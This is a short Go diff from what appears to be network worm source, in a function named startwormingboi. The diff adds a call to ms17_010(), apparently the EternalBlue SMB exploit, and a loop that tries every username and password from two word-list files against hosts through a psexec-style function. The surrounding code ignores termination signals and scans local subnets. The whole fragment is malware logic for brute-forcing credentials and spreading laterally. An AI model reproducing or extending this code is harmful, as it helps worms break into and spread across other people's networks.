@@ -35,6 +35,7 @@ func main(){
     t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
 	t.Reserve(handler1)
 	myos := runtime.GOOS
+	ms17_010()
 	startwormingboi(myos)
 	for len(os.Args) == 1{
 		time.Sleep(5 * time.Minute)
@@ -47,6 +48,12 @@ func startwormingboi(myos string) {
 
 	var user = readinfile("user.txt")
 	var passwds = readinfile("passwds.txt")
+	for _, username := range(user) {
+		for _, password := range(passwds) {
+			pysexec(username, password)
+		}
+	}
+	
 	var subnets = ""
 	if len(os.Args) == 1 {
 		subnets = GetOutboundIP()
